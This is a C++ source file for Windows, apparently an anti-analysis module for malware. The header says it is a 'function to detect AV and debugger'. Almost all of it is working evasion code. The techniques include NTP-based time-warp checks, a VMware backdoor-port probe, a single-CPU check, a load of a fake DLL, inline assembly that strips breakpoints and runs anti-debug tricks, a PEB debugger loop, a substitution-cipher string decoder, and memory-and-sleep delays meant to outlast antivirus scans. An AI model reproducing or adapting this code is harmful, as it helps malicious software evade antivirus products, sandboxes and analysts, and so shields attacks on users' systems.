/*
Function to detect AV and debugger
Some ideas are from https://www.exploit-db.com/docs/40900.pdf
some other infos : https://www.exploit-db.com/docs/34591.pdf
https://www.vmray.com/blog/sandbox-evasion-techniques-part-1/

You may download the instruction set from Intel official web site.
Instructions from A-M (http://www.intel.com/assets/pdf/manual/253666.pdf)
Instructions from N-Z (http://www.intel.com/assets/pdf/manual/253667.pdf)

AV Check : https://nodistribute.com/result/T4QSP7WbKwyiHB3aedMtvjUY
*/


#include "includes.h"
#include "define.h"
#include "extern.h"
#include "ntp.h"

char decode_buffer[1024];

/******************************************************************************
* Class Member Function Definitions
*****************************************************************************/
void Timestamp::ReverseEndian(void) {
	ReverseEndianInt(seconds);
	ReverseEndianInt(fraction);
}

time_t Timestamp::to_time_t(void) {
	return (seconds - JAN_1970) & 0x7fffffff;
}

void NTPMessage::ReverseEndian(void) {
	ref.ReverseEndian();
	orig.ReverseEndian();
	rx.ReverseEndian();
	tx.ReverseEndian();
}

int NTPMessage::recv(int sock) {
	int ret = ::recv(sock, (char*)this, sizeof(*this), 0);
	ReverseEndian();
	return ret;
}

int NTPMessage::sendto(int sock, struct sockaddr_in* srv_addr) {
	ReverseEndian();
	int ret = ::sendto(sock, (const char*)this, sizeof(*this), 0, (sockaddr*)srv_addr, sizeof(*srv_addr));
	ReverseEndian();
	return ret;
}

void NTPMessage::clear() {
	memset(this, 0, sizeof(*this));
}

char *decode(char *texte)
// Proc�dure de d�codage �l�mentaire de chaine de caract�re par substitution
// ex : "Uoux otg zk Gotg!" == "Ceci est un Test!"
// use tr "wqazsxcderfvbgtyhnjuiklopmWQAZSXCDERFVBGTYHNJUIKLOPM" "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
{
	char *substitution_string[] = { "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM", "wqazsxcderfvbgtyhnjuiklopmWQAZSXCDERFVBGTYHNJUIKLOPM" };
	strcpy(decode_buffer, texte);
	for (int c = 0; c < strlen(texte); c++) {
		for (int s = 0; s < 52; s++) {
			if (texte[c] == substitution_string[0][s])
				decode_buffer[c] = substitution_string[1][s];
		}
	}
	return(decode_buffer);
}

/*!
******************************************************************************
\fn         void dns_lookup(const char *host, sockaddr_in *out)
\brief	    Resolve hostname
\param		host	User-supplied string of the hostname
\param		out		A sockaddr_in structure with the hostname resolved
\par        Example of use:
\c			dns_lookup("pool.ntp.org", &srv_addr);
\c			char *host = "pool.ntp.org";
\c			dns_lookup(host, &srv_addr);
******************************************************************************
*/
void dns_lookup(const char *host, sockaddr_in *out)
{
	struct addrinfo *result;
	int ret = getaddrinfo(host, "ntp", NULL, &result);
	for (struct addrinfo *p = result; p; p = p->ai_next)
	{
		if (p->ai_family != AF_INET)
			continue;

		memcpy(out, p->ai_addr, sizeof(*out));
	}
	freeaddrinfo(result);
}

/// <summary>
/// Function : Get UTC time from an NTP Server.
/// Input : the UTC time of the local machine (time_t format).
/// Output : the UTC time of world (time_t format)
/// </summary>
time_t Get_NTP_Time(time_t sys_time)
{
	WSADATA wsaData;
	int iResult;

	DEBUGMSG("Before WSAStartup");
	DWORD ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (ret != 0)
	{
		// Can't find a suitable socket ?!
		DEBUGMSG("Can't find a suitable socket ?!");
		return 0;
	}
	DEBUGMSG("After WSAStartup");
	if (HIBYTE(wsaData.wVersion) < 2) {
		/* Tell the user that we could not find a usable */
		/* WinSock DLL.                                  */
		DEBUGMSG("we could not find a usable WinSock DLL");
		WSACleanup();
		return 0;
	}

	char *host = POOL_NTP_HOST;  /* Don't distribute stuff pointing here, it's not polite. */
								 //char *host = "time.nist.gov";
								 /* This one's probably ok, but can get grumpy about request rates during debugging. */

	/* Create NTP Message */
	NTPMessage msg;
	msg.clear();						// Zero all bytes
	msg.flags.version = 4;				// Version 4
	msg.flags.mode = 3;					// Mode Client (3)
	msg.flags.leap = 3;					// leap indicator unknowed(3) clock unsynchronized
	msg.stratum = 0;					// stratum unspecified
	msg.poll = 3;						// poll interval invalid
	msg.precision = 0xFA;				// 0.015625 sec why not ?!
	msg.root_delay = 0x00001000;		// 1 second = 0x0001 0x0000 in reverse Endian
	msg.root_dispertion = 0x00001000;	// 1 second = 0x0001 0x0000 in reverse Endian
	msg.tx.seconds = sys_time + JAN_1970;

	/* Create the response */
	NTPMessage response;
	response.clear();

	// Open a socket
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) {
		DEBUGMSGF("Error at socket(): %ld\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}
	// create the layer 3 of the message
	sockaddr_in srv_addr;
	memset(&srv_addr, 0, sizeof(srv_addr));
	srv_addr.sin_port = htons(123);			// 123 for NTP
	srv_addr.sin_family = AF_INET;			// it's an UDP packet
	dns_lookup(host, &srv_addr);			// Determine the NTP server with DNS Round Robin

	// Send packet on the net ...
	iResult = msg.sendto(sock, &srv_addr);
	if (iResult == SOCKET_ERROR)
	{
		DEBUGMSGF("sendto failed with error: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 0;
	}
	// wait and read the response
	iResult = response.recv(sock);
	if (iResult == SOCKET_ERROR)
	{
		DEBUGMSGF("recv failed with error: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 0;
	}
	// clean all
	closesocket(sock);
	WSACleanup();

	return response.tx.to_time_t();
}

void TimetToFileTime(time_t t, LPFILETIME pft)
{
	LONGLONG ll = Int32x32To64(t, 10000000) + 116444736000000000;
	pft->dwLowDateTime = (DWORD)ll;
	pft->dwHighDateTime = ll >> 32;
}

/// <summary>
/// *Function : Check if an another process try to time warp me.
/// *Input    : nothing.
/// *Output   : 0 if we are not in the tardis, not 0 if we travel in time */
/// </summary>
int check_time_warp(void)
{
	SYSTEMTIME st, lt, sft;
	//LARGE_INTEGER ntst;
	FILETIME ft;
	time_t ntp_time, UTC_time, diff_time;
	struct tm  local_tm_time;
	unsigned int ExitCode = 0;

	GetSystemTime(&st);		// Retrieves the current system date and time.
							// The system time is expressed in Coordinated Universal Time (UTC).
	GetLocalTime(&lt);		// Retrieves the current local date and time.

	GetSystemTimeAsFileTime(&ft);
	FileTimeToSystemTime(&ft, &sft);

	if (&st == NULL || &lt == NULL || &ft == NULL || &sft == NULL)
	{
		DEBUGMSG("EXIT_CODE_TIME_WARP_NULL");
		ExitCode += EXIT_CODE_TIME_WARP_NULL; // probably BitDefender or an another AV SandBox
	}

	if (st.wYear <= 2015)
	{
		DEBUGMSG("EXIT_CODE_TIME_WARP_2015");
		ExitCode += EXIT_CODE_TIME_WARP_2015; // Incoherent Date
	}

	/* Check if the time is too far from the NTP time
	sometime sandbox try to do timewarp ...
	*/

	// convert Local Time to a tm struct
	local_tm_time.tm_year = lt.wYear - 1900;
	local_tm_time.tm_mon = lt.wMonth - 1;
	local_tm_time.tm_mday = lt.wDay;
	local_tm_time.tm_hour = lt.wHour;
	local_tm_time.tm_min = lt.wMinute;
	local_tm_time.tm_sec = lt.wSecond;

	// convert Localtime to EPOC
	UTC_time = mktime(&local_tm_time);

	// Get UTC from NTP server
	DEBUGMSG("get NTP time");
	ntp_time = Get_NTP_Time(UTC_time);
	if (ntp_time == 0)
	{
		DEBUGMSG("EXIT_CODE_ERROR_NTPD");
		// do nothing with NTP, because we are probably behind a firewall
	}
	else {
		// Calculate the diff
		diff_time = UTC_time - ntp_time;
		// Check the diff, if it's too different, we are in a time warp
		if ((diff_time <= -UTC_TIME_DIFF) && (diff_time >= UTC_TIME_DIFF))
		{
			DEBUGMSG("EXIT_CODE_TIME_WARP_NTPD");
			ExitCode += EXIT_CODE_TIME_WARP_NTPD;
		}
		DEBUGMSGF("Difftime = %I64d\n", diff_time);
	}

	// Try to find if 1000 milliseconds is really 1000 milliseconds
	DWORD Tick = GetTickCount();
	Sleep(1000);

	__asm {
		PUSH EAX;
		XOR EAX, EAX;
		JZ J;
		INC EDX;
		INC EDX;
		INC EDX;
		INC EDX;
	J:	POP EAX;
	}

	DWORD Tac = GetTickCount();
	if ((Tac - Tick) < 1000) {
		DEBUGMSG("EXIT_CODE_TICK_COUNT_TOO_QUICK");
		DEBUGMSGF("Difftime = %I64d\n", (Tac - Tick));
		ExitCode += EXIT_CODE_TICK_COUNT_TOO_QUICK;
	}
	return ExitCode;
}

BOOL LoadFakeLibrary(void)
{
	HINSTANCE DLL = LoadLibrary(TEXT("crashandler64.dll"));
	return (DLL != NULL);
}

BOOL CheckIfOneCPU(void)
{
	BOOL nbcpu = FALSE;
	// Check if only one CPU is available
	SYSTEM_INFO SysGuide;
	GetSystemInfo(&SysGuide);
	if (SysGuide.dwNumberOfProcessors < 2) 
		nbcpu = TRUE;
	else 
		nbcpu = FALSE;
	return nbcpu;
}

void Some_ASM_trick(void)
{
	// Get From https://www.opensc.ws/showthread.php?t=20894
	DEBUGMSG("Before Some_ASM_trick");
	__asm
	{
		/* Save used registers so we can call this code anywhere */
		push ebx
		push eax
		push ecx
		/* We are going to look for breakpoints, this will be obviously be detected */
		xor ebx, ebx
		mov bl, 0xCC
	blocStart:
		/* Get addr and size of block we want to check against breakpoints */
		mov eax, blocStart
		mov ecx, blocEnd
		sub ecx, blocStart
	antiBpLoop :
		// check if the opcode is 0xCC
		cmp byte ptr[eax], bl
		jne continueLoop
		// If detected breakpoint opcode is replaced by a short jump opcode
		mov[eax], 0xEB
	continueLoop :
		inc eax
		dec ecx
		/* Loop */
		jnz antiBpLoop
		/* Here we finished to remove breakpoints */
		mov ecx, 2
		/* Going to insert garbage code */
		xor eax, eax
		jz valid
		// Garbage code confusing disassembler using add opcode (0x02)
		// This is done to hide the 0xCC opcode coming next
		__asm __emit(0x02)
	valid:
		 // Software breakpoint to be replaced by jump. If not replaced, code fails
		 __asm __emit(0xcc)
		 // offset to jump (jump to anti debug code). This is executed if previous line breakpoint is not replaced.
		 __asm __emit(0x02)
		 ret
		 /* Garbage code confusing disassembler using long Add rmw, the code will fail here if CC replaced by something else  */
		 __asm __emit(0x81)
		 /* Anti debug code ) */
		 sub ebx, 0xB4
		 // Now ebx = 0x18
		 mov eax, dword ptr fs : [ebx]
		 add ebx, ebx
		 // 0x30 = 0x18 + 0x18
		 mov eax, dword ptr[eax + ebx]
		 // This is why we moved 2 in ecx register
		 cmp byte ptr[eax + ecx], ch
		 pop ecx
		 pop eax
		 pop ebx
		 je blocEnd
		 /* Garbage code confusing disassembler using long jump. Also this jump is called if process is debugged, leading to crash */
		 __asm __emit(0xea)
	 blocEnd:
		// Behind that  code will be unreadable (probably display as constant). 
	}
	DEBUGMSG("After Some_ASM_trick");
}

BOOL vmware(void)
{
	unsigned long _EBX;
	__try
	{
		__asm
		{
			// Execute the magic code sequence
			push ebx
			mov eax, 0x564D0000
			mov ah, 0x57		// just a tricky obfuscation
			mov al, 0x69
			inc ah
			dec al
			mov ebx, 0x42424242 // Ensure 0x564D5868 isn't in EBX :)
			mov ecx, 10         // The command for obtaining VMWare version information
			mov dh, 0x55		// just a tricky obfuscation
			mov dl, 0x59
			inc dh
			dec dl
			in eax, dx
			mov _EBX, ebx
			inc ebx
			pop ebx
		};
	}
	__except (1)
	{
		// An exception occured, we ain't in VMWare
		return false;
	}

	// The code was executed successfuly, check for the magic value +1
	return _EBX == 0x564D5869;
}

/// <summary>
/// This function try to detect some AV that can detect me
/// </summary>
BOOL noav(BOOL InThread = TRUE)
{
	WORD ExitCode = 0;

	// First Check : Examine the time evolution
	ExitCode &= check_time_warp();

	// Try to load a non existant DLL
	if (LoadFakeLibrary() == TRUE) {
		DEBUGMSG("EXIT_CODE_FAKE_LIBRARY_LOADED");
		ExitCode &= EXIT_CODE_FAKE_LIBRARY_LOADED;
	}

	// Check if only one CPU is present, so it's a VM
	if (CheckIfOneCPU() == TRUE)
	{
		DEBUGMSG("EXIT_CODE_ONLY_ONE_CPU");
		ExitCode &= EXIT_CODE_ONLY_ONE_CPU;
	}

	// Check if in VMWare
	if (vmware())
	{
		DEBUGMSG("EXIT_CODE_VMWARE");
		ExitCode &= EXIT_CODE_VMWARE;
	}

	Some_ASM_trick();

	/* 	This method also exploits the time deadline on each AV scan, we simply allocate
	nearly 42 Mb of memory then we will fill it with some bytes, at the end we will
	free it.*/
	for (int i = 0; i < ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING; i += 6) {
		// Allocate a zone of 42Mb of memory, fill it with zero and free it
		char *MemoryToBeZeroized = NULL;
		MemoryToBeZeroized = (char *)malloc(ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte); // two time of Answer to the Ultimate Question of Life, the Universe, and Everything
		Sleep(10123); // wait 10,123 seconds just for fun :-)
		if (MemoryToBeZeroized != NULL) {
			memset(MemoryToBeZeroized, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte);
			free(MemoryToBeZeroized);
		}
	}

	// Examine all process name
	//TODO

	if ((ExitCode != 0) && (InThread == FALSE))
	{
		DEBUGMSG("NOAV exit and detect a problem, its suspect...");
		exit(ExitCode);
	}
	else {
		return ExitCode;
	}
}

void LoopUntilNotDebugged(void)
{
	__asm {
	CheckDebugger:
		PUSH EAX;						// Save EAX
		MOV EAX, DWORD PTR FS : [0x18];	// Get PEB structure address
		__asm {							// Some garbage ...
			PUSH EAX;
			XOR EAX, EAX;
			JZ J;
			__asm __emit(0xEA);
		J:	POP EAX;
		}
		MOV EAX, DWORD PTR[EAX + 0x30];	// Get BeingDebuged Byte
		CMP BYTE PTR[EAX + 2], 0;		// Check if BeingDebuged byte is set
		JNE CheckDebugger;				// Loop until not debugged :-)
		POP EAX;						// restore EAX
	}
}

void noreverse(void)
{
	// Change Trap Flag
	/* The trap flag is used for tracing the program. If this flag is set every instruction
	will raise �SINGLE_STEP� exception. Trap flag can be manipulated in order thwart
	tracers.*/

	// TODO : check better the code generated !!!
	__asm {
		PUSHF;
		PUSHF;
		PUSH AX;
		MOV AX, [ESP + 2];
		AND AX, 0x0100;
		MOV[ESP], AX;
		POP EAX;
		__emit(0xEB);
		__emit(0x02); // JMP short loc_1;
		__emit(0xE8);
		__emit(0xCC);
	loc_1:
		POPF;
		POPF;
	}
	LoopUntilNotDebugged();
}

DWORD WINAPI NoAVThread(LPVOID param)
{
	while (TRUE)
	{
		DEBUGMSG("It's time to check if AV or some other reverse engine is here ...");
		noav(TRUE);
		Sleep(12345);
	}
}
void StartNoAVThread(void)
{
	HANDLE NOAV_Thread;
	NOAV_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NoAVThread, NULL, 0, NULL);
	if (NOAV_Thread == NULL)
	{
		// Exit or not Exit ?
		return;
	}
}

